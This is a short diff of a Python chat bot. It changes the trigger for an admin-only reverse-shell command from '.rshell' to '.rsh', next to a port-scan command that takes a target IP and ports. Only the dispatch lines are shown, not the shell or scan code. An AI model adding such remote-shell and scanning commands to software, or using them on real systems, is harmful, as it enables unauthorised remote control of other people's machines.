@@ -481,8 +481,8 @@ def main():
                         message = "Could not parse. The command should be in the format of '.scan [targetIP] [comma,seperated,ports]' to work properly."
                     sendmsg(message, adminname)
 
-                # Respond to '.rshell [target] [port]' command from admin.
-                if name.lower() == adminname.lower() and message[:5].find('.rshell') != -1:
+                # Respond to '.rsh [target] [port]' command from admin.
+                if name.lower() == adminname.lower() and message[:5].find('.rsh') != -1:
                     if enableshell:
                         target = message.split(' ', 1)[1]
                         if target.find(' ') != -1:
